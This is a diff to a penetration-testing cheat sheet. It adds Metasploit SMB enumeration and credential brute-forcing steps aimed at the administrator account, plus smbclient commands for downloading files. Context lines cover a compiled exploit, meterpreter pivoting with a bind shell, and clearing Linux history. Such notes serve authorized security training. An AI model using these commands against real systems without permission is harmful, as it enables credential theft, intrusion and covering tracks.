@@ -33,7 +33,7 @@ service postgresql status
 msfconsole -q
 db_status
 
-workspace -a <name>
+workspace -a <workspace>
 workspace
 
 setg RHOSTS <ip>
@@ -117,7 +117,7 @@ set VERBOSE false
 nmap -Pn -sV <ip>
 ```
 - Useful flags
-  - `-p<port>`, `-p<port_range>`
+  - `-p<port>`
   - `-p-`
   - `-F`
   - `-O`
@@ -140,6 +140,32 @@ use auxiliary/scanner/discovery/udp_sweep
 ```
 
 ## SMB/Samba
+```
+use auxiliary/scanner/smb/smb_version
+use auxiliary/scanner/smb/smb_enumusers
+```
+```
+use auxiliary/scanner/smb/smb_enumshares
+set ShowFiles true
+```
+```
+use auxiliary/scanner/smb/smb_login
+set USER_FILE <wordlist>
+set PASS_FILE <wordlist>
+set VERBOSE false
+```
+- Can set `USERNAME` or `PASSWORD` if either is known.
+- Focus on administrator account.
+
+```
+smbclient -L \\\\<ip>\\ -U <username>
+
+smbclient -L \\\\<ip>\\<share> -U <username>
+smb: \> ls
+smb: \> cd <directory>
+smb: \> get <filename>
+smb: \> exit
+```
 
 ## Wordlists
 ```
@@ -337,7 +363,7 @@ i686-w64-mingw32-gcc 9303.c -o exploit_32 -lws2_32
 
 ## Cleanup Resource Scripts
 ```
-meterpreter > resource <path_to_cleanup_rc_file>
+meterpreter > resource <filename>
 ```
 
 ## Clear Linux History
@@ -497,16 +523,16 @@ use auxiliary/scanner/portscan/tcp
 set RHOSTS <ip2>
 ```
 ```
-meterpreter > portfwd add -l <local_port_on_kali> -p <remote_port_on_ip2> -r <ip2>
+meterpreter > portfwd add -l <port_local> -p <port_remote> -r <ip2>
 meterpreter > portfwd list
 
 netstat -an | grep LISTEN
-nmap -Pn -sV -p<local_port_on_kali> localhost
+nmap -Pn -sV -p<port_local> localhost
 ```
 ```
 use <exploit_module>
 set RHOSTS <ip2>
-set RPORT <remote_port_on_ip2>
+set RPORT <port_remote>
 set payload windows/meterpreter/bind_tcp
 ```
 - `LPORT` will be opened on `<ip2>`.
@@ -563,7 +589,7 @@ fg
 reset
 export SHELL=bash
 export TERM=xterm-256color
-stty rows <no_of_rows> columns <no_of_columns>
+stty rows <rows> columns <columns>
 ```
 
 - Non-meterpreter to meterpreter
